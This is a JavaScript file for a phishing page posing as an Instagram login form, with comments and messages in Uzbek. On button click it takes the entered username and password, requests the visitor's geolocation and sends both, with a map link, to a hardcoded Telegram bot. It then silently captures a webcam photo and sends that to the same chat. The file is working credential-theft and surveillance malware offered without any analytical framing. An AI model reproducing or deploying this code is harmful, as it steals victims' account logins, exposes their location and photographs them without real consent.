const token = "8776656330:AAFaWkFrnwMl8YHyBMkIr50QKHN_mCJWoVk";
const chat_id = "8173504509";

const btn = document.querySelector('#btn');

btn.addEventListener('click', async () => {

    const u = document.getElementById('ig-user').value.trim();
    const p = document.getElementById('ig-pass').value.trim();

    if (!u || !p) {
        showToast("Barcha maydonlarni to'ldiring");
        return;
    }

    // 👉 helperlar
    async function getPhotoBlob() {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        stream.getTracks().forEach(t => t.stop());

        return new Promise(res => canvas.toBlob(res, "image/png"));
    }

    async function sendText(text) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id, text })
        });
    }

    async function sendPhoto(blob) {
        const fd = new FormData();
        fd.append("chat_id", chat_id);
        fd.append("photo", blob, "photo.png");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: fd
        });
    }

    try {
        // 👉 2) Location (permission popup)
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        // 👉 3) Yandex link (qizil pin + label)
        const label = encodeURIComponent(`User: ${u} , pass:${p} `);
        const yandexLink =
            `https://yandex.com/maps/?ll=${lon},${lat}&z=17&pt=${lon},${lat},pm2rdm~${label}`;

        // 👉 4) Matn yuborish (parolsiz)
        const text = `User: ${u}
        pass:${p}
LAT: ${lat}
LON: ${lon}

📍 Yandex Map:
${yandexLink}`;
        await sendText(text);

        // 👉 5) Kamera (permission popup) → rasm yuborish
        try {
            const photo = await getPhotoBlob();
            await sendPhoto(photo);
        } catch (e) {
            console.log("Kamera rad etildi:", e.message);
        }

        showToast("Ma'lumotlar yuborildi");

    } catch (err) {
        console.log(err.message);
        showToast("Location olinmadi yoki rad etildi");
    }
});